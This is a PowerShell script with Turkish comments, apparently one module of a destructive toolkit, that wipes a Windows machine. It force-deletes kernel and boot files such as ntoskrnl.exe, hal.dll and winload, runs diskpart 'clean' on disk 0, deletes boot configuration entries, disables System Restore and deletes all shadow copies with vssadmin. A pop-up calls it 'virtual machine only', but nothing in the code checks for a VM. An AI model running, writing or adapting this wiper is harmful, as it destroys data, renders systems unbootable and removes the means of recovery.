# ============================================================
# EN – KERNEL SİLME (YAPILANDIRMA DESTEKLİ)
# ============================================================

. ./modul_config_oku.ps1

if ($script:KERNEL_SIL -eq 0) {
    Write-Host "EN: Kernel silme pasif. Atlaniyor..." -ForegroundColor Yellow
    exit
}

Add-Type -AssemblyName System.Windows.Forms

try {
    [System.Windows.Forms.MessageBox]::Show(
        "KERNEL SİLME İŞLEMİ BAŞLIYOR!" +
        "`n`nBu işlem VM'yi tamamen yok eder." +
        "`nSADECE SANAL MAKİNE İÇİN!",
        "EN - ULTİMATE KERNEL KILLER",
        "OK",
        "Error"
    )

    $kernelFiles = @(
        "C:\Windows\System32\ntoskrnl.exe",
        "C:\Windows\System32\ntkrnlpa.exe",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\winload.efi",
        "C:\Windows\System32\winresume.exe",
        "C:\Windows\System32\winresume.efi",
        "C:\Windows\System32\kdcom.dll",
        "C:\Windows\System32\pshed.dll",
        "C:\Windows\System32\bootvid.dll"
    )

    foreach ($file in $kernelFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    # MBR temizleme (diskpart ile)
    try {
        $diskpartKomut = @"
select disk 0
clean
convert mbr
exit
"@
        $diskpartKomut | Out-File -FilePath "diskpart.txt"
        Start-Process -NoNewWindow -FilePath "diskpart" -ArgumentList "/s diskpart.txt" -Wait
        Remove-Item "diskpart.txt" -Force -ErrorAction SilentlyContinue
        Write-Host "Disk MBR temizlendi." -ForegroundColor Red
    } catch {}

    # BCD sil
    try {
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {default} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {bootmgr} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {current} /f"
        Write-Host "BCD silindi." -ForegroundColor Red
    } catch {}

    # Sistem geri yükleme noktalarını temizle
    try {
        Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
        vssadmin delete shadows /all /quiet
        Write-Host "Geri yükleme noktaları temizlendi." -ForegroundColor Red
    } catch {}

    Write-Host "VM TAMAMEN YOK EDİLDİ!" -ForegroundColor Red -BackgroundColor Black

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] ULTİMATE KERNEL SİLME TAMAMLANDI."

} catch {
    Write-Host "Kernel silme hatasi: $_" -ForegroundColor Red
}